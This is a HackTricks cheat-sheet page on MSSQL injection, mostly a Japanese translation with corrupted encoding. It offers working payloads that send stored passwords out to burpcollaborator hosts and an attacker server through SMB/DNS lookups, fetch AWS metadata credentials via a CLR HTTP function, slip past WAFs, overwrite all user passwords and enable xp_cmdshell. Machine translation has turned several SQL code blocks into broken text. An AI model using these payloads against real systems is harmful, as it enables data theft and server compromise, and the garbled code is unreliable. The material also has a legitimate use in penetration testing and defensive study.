# MSSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚’é€šã˜ã¦ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ï¼š[**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## Active Directoryã®åˆ—æŒ™

æ¬¡ã®MSSQLé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€**MSSQLå†…ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä»‹ã—ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼š

- **`SELECT DEFAULT_DOMAIN()`**ï¼šç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å–å¾—ã—ã¾ã™ã€‚
- **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**ï¼šãƒ‰ãƒ¡ã‚¤ãƒ³ã®åå‰ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆï¼ˆã“ã®ä¾‹ã§ã¯_DOMAINï¼‰ã€ã“ã®é–¢æ•°ã¯16é€²æ•°å½¢å¼ã§**ãƒ¦ãƒ¼ã‚¶ãƒ¼Administratorã®SID**ã‚’è¿”ã—ã¾ã™ã€‚ã“ã‚Œã¯`0x01050000000[...]0000f401`ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚æœ€å¾Œã®4ãƒã‚¤ãƒˆãŒã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼Administratorã®ä¸€èˆ¬çš„ãªIDã§ã‚ã‚‹500**ã®**ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³å½¢å¼**ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚\
ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ãƒ‰ãƒ¡ã‚¤ãƒ³ã®IDã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆæœ€å¾Œã®4ãƒã‚¤ãƒˆä»¥å¤–ã®ã™ã¹ã¦ã®ãƒã‚¤ãƒˆï¼‰ã€‚
- **`SUSER_SNAME(0x01050000000[...]0000e803)`**ï¼šã“ã®é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸIDã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’è¿”ã—ã¾ã™**ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã€‚ã“ã®å ´åˆã€**0000e803**ã¯ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§**1000**ã«ç­‰ã—ã„ï¼ˆé€šå¸¸ã€ã“ã‚Œã¯ä½œæˆã•ã‚ŒãŸæœ€åˆã®é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã®IDã§ã™ï¼‰ã€‚ãã®å¾Œã€1000ã‹ã‚‰2000ã¾ã§ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã€ãŠãã‚‰ããƒ‰ãƒ¡ã‚¤ãƒ³ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å–å¾—ã§ãã‚‹ã¨æƒ³åƒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **ä»£æ›¿ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ã‚¿ãƒ¼**

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯é€šå¸¸ã€`+AND+1=@@version--`ã®ã‚ˆã†ãªæ§‹é€ ã‚’ã—ã¦ãŠã‚Šã€ORæ¼”ç®—å­ã«åŸºã¥ãå¤‰å½¢ã‚‚ã‚ã‚‹ã€‚ã“ã®ã‚ˆã†ãªå¼ã‚’å«ã‚€ã‚¯ã‚¨ãƒªã¯é€šå¸¸ã€WAFã«ã‚ˆã£ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã‚‹ã€‚å›é¿ç­–ã¨ã—ã¦ã€%2bæ–‡å­—ã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’é€£çµã—ã€ç‰¹å®šã®é–¢æ•°å‘¼ã³å‡ºã—ã®çµæœã¨çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ã§ã€æ±‚ã‚ã¦ã„ã‚‹ãƒ‡ãƒ¼ã‚¿ã«ãƒ‡ãƒ¼ã‚¿å‹å¤‰æ›ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™é–¢æ•°ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã€‚

ã“ã®ã‚ˆã†ãªé–¢æ•°ã®ä¾‹ï¼š

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

é–¢æ•° `USER_NAME()` ã®ä½¿ç”¨ä¾‹ï¼š
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

ã“ã‚Œã‚‰ã®SSRFãƒˆãƒªãƒƒã‚¯ã¯[ã“ã¡ã‚‰](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸã€‚

### `fn_xe_file_target_read_file`

ã‚µãƒ¼ãƒãƒ¼ã§**`VIEW SERVER STATE`**æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

**`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

**`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

`xp_dirtree`ãªã©ã®ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¯ã€Microsoftã«ã‚ˆã£ã¦å…¬å¼ã«æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã›ã‚“ãŒã€MSSQLå†…ã§ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ“ä½œã«ãŠã„ã¦ãã®æœ‰ç”¨æ€§ãŒä»–ã®äººã€…ã«ã‚ˆã£ã¦ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã§èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¯ã€ã•ã¾ã–ã¾ãª[ä¾‹](https://www.notsosecure.com/oob-exploitation-cheatsheet/)ã‚„[æŠ•ç¨¿](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)ã§ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€Out of Band Dataã®æƒ…å ±æ¼æ´©ã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãŸã¨ãˆã°ã€`xp_dirtree`ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ãŒã€TCPãƒãƒ¼ãƒˆ445ã«ã®ã¿åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒãƒ¼ãƒˆç•ªå·ã¯å¤‰æ›´ã§ãã¾ã›ã‚“ãŒã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å…±æœ‰ã‹ã‚‰èª­ã¿å–ã‚Šã‚’è¨±å¯ã—ã¾ã™ã€‚ä»¥ä¸‹ã®SQLã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ãã®ä½¿ç”¨æ³•ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ï¼š
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
ã“ã®æ–¹æ³•ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹`Windows Server 2016 Datacenter`ä¸Šã®`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`ãªã©ã€ã™ã¹ã¦ã®ã‚·ã‚¹ãƒ†ãƒ æ§‹æˆã§æ©Ÿèƒ½ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

ã•ã‚‰ã«ã€`master..xp_fileexist`ã‚„`xp_subdirs`ãªã©ã®ä»£æ›¿ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ãŒã‚ã‚Šã€åŒæ§˜ã®çµæœã‚’é”æˆã§ãã¾ã™ã€‚`xp_fileexist`ã®è©³ç´°ã«ã¤ã„ã¦ã¯ã€ã“ã®[TechNetã®è¨˜äº‹](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

æ˜ã‚‰ã‹ã«ã€**`xp_cmdshell`**ã‚’ä½¿ç”¨ã—ã¦ã€**SSRF**ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ä½•ã‹ã‚’**å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ãƒšãƒ¼ã‚¸å†…ã®è©²å½“ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’**èª­ã‚“ã§ãã ã•ã„**ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQLãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

MSSQLå†…ã§ã‚«ã‚¹ã‚¿ãƒ é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«CLR UDF (Common Language Runtime User Defined Function)ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€ä»»æ„ã®.NETè¨€èªã§è¨˜è¿°ã•ã‚Œã€DLLã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã‚’MSSQLå†…ã§ãƒ­ãƒ¼ãƒ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯`dbo`ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒå¿…è¦ã§ã™ã€‚ã¤ã¾ã‚Šã€é€šå¸¸ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šãŒ`sa`ã¨ã—ã¦è¡Œã‚ã‚Œã‚‹ã‹ã€ç®¡ç†è€…ãƒ­ãƒ¼ãƒ«ã§è¡Œã‚ã‚Œã‚‹å ´åˆã«ã®ã¿å®Ÿç¾å¯èƒ½ã§ã™ã€‚

Visual Studioãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã¯ã€[ã“ã®Githubãƒªãƒã‚¸ãƒˆãƒª](https://github.com/infiniteloopltd/SQLHttp)ã§æä¾›ã•ã‚Œã¦ãŠã‚Šã€CLRã‚¢ã‚»ãƒ³ãƒ–ãƒªã¨ã—ã¦MSSQLã«ãƒã‚¤ãƒŠãƒªã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã‚’å®¹æ˜“ã«ã—ã€MSSQLå†…ã‹ã‚‰HTTP GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

ã“ã®æ©Ÿèƒ½ã®ä¸­å¿ƒã¯ã€`http.cs`ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚«ãƒ—ã‚»ãƒ«åŒ–ã•ã‚Œã¦ãŠã‚Šã€`WebClient`ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã—ã¦GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã€ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å–å¾—ã—ã¾ã™ã€‚
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
å®Ÿè¡Œã™ã‚‹å‰ã«ã€`CREATE ASSEMBLY` SQLã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å‰ã«ã€æ¬¡ã®SQLã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’å®Ÿè¡Œã—ã¦ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®SHA512ãƒãƒƒã‚·ãƒ¥ã‚’ã‚µãƒ¼ãƒãƒ¼ã®ä¿¡é ¼ã•ã‚ŒãŸã‚¢ã‚»ãƒ³ãƒ–ãƒªã®ãƒªã‚¹ãƒˆã«è¿½åŠ ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ï¼ˆ`select * from sys.trusted_assemblies;`ã‚’ä½¿ç”¨ã—ã¦è¡¨ç¤ºå¯èƒ½ï¼‰ã€‚
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
æˆåŠŸã—ãŸã‚¢ã‚»ãƒ³ãƒ–ãƒªã®è¿½åŠ ã¨é–¢æ•°ã®ä½œæˆå¾Œã€æ¬¡ã®SQLã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **ã‚¯ã‚¤ãƒƒã‚¯ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³: 1ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«å…¨ä½“ã®å†…å®¹ã‚’å–å¾—ã™ã‚‹**

[ã“ã“ã‹ã‚‰ã®ãƒˆãƒªãƒƒã‚¯](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)ã€‚

1ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«ã®å…¨ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æŠ½å‡ºã™ã‚‹ç°¡æ½”ãªæ–¹æ³•ã¯ã€`FOR JSON`å¥ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€"raw"ã®ã‚ˆã†ãªç‰¹å®šã®ãƒ¢ãƒ¼ãƒ‰ãŒå¿…è¦ãª`FOR XML`å¥ã‚ˆã‚Šã‚‚ç°¡æ½”ã§ã™ã€‚`FOR JSON`å¥ã¯ç°¡æ½”ã•ãŒå¥½ã¾ã‚Œã¾ã™ã€‚

ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚¹ã‚­ãƒ¼ãƒã€ãƒ†ãƒ¼ãƒ–ãƒ«ã€ãŠã‚ˆã³åˆ—ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```plaintext
https://vuln.app/getItem?id=1'+ãŠã‚ˆã³1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```plaintext
SQL Injection MSSQLã®ä¾‹

ä»¥ä¸‹ã¯ã€MSSQLã®SQL Injectionæ”»æ’ƒã®ä¾‹ã§ã™ã€‚

https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:

```
## MSSQL Injection

### MSSQL Union-Based Injection

#### Description

The MSSQL Union-Based Injection technique is used to retrieve information from a database by combining the result sets of two or more SELECT statements. This technique can be used to extract data from the database that the application may not normally return.

#### Payload

```plaintext
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

#### Explanation

- `1` is the original query to retrieve an item with the ID of 1.
- `%C2%85` represents the Unicode character for a vertical tab, which is used as a union operator in MSSQL.
- `union` is the keyword to combine the result sets.
- `select null,@@version,null` is the injected SQL statement to retrieve the version of the MSSQL database.
- `--` is used to comment out the rest of the original query to avoid syntax errors.

#### Impact

By successfully executing an MSSQL Union-Based Injection, an attacker can retrieve sensitive information from the database, such as version numbers, table names, and other data that can aid in further attacks.
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
```md
## MSSQL Injection

### Union-Based MSSQL Injection

The following are examples of union-based MSSQL injection for extracting the version of the database:

- `https://vuln.app/getItem?id=0eunion+select+null,@@version,null--`

- `https://vuln.app/getItem?id=0xunion+select+null,@@version,null--`
```
```

A period instead of a whitespace between FROM and a column name:

```
## MSSQL Injection

### MSSQL Union-Based Injection

The following URL is vulnerable to a union-based SQL injection targeting a MSSQL database:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
```

\N separator between SELECT and a throwaway column:

```
```plaintext
SQL Injection (MSSQL) Example:

URL: https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

```plaintext
SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆMSSQLï¼‰ã®ä¾‹ï¼š

URL: https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
```plaintext
'a' ã‚’é¸æŠã—ã¾ã™ 'b' ã‚’é¸æŠã—ã¾ã™
```
```

So for example, multiple queries such as:

```sql
```plaintext
[tempdb]ã‚’ä½¿ç”¨
ãƒ†ãƒ¼ãƒ–ãƒ«[test]ã‚’ä½œæˆ ([id] int)
[test]ã«å€¤(1)ã‚’æŒ¿å…¥
[test]ã‹ã‚‰[id]ã‚’é¸æŠ
ãƒ†ãƒ¼ãƒ–ãƒ«[test]ã‚’å‰Šé™¤
```
```

Can be reduced to:

```sql
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# æœ€å¾Œã«ç„¡é§„ãªexec()ã‚’è¿½åŠ ã—ã€WAFã«ã“ã‚ŒãŒæœ‰åŠ¹ãªã‚¯ã‚¨ãƒªã§ã¯ãªã„ã¨æ€ã‚ã›ã‚‹
admina'union select 1,'admin','testtest123'exec('select 1')--

## ã“ã‚Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# å¥‡å¦™ã«æ§‹ç¯‰ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã™ã‚‹
admin'exec('update[users]set[password]=''a''')--

## ã“ã‚Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# ã¾ãŸã¯xp_cmdshellã‚’æœ‰åŠ¹ã«ã™ã‚‹
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--

## ã“ã‚Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
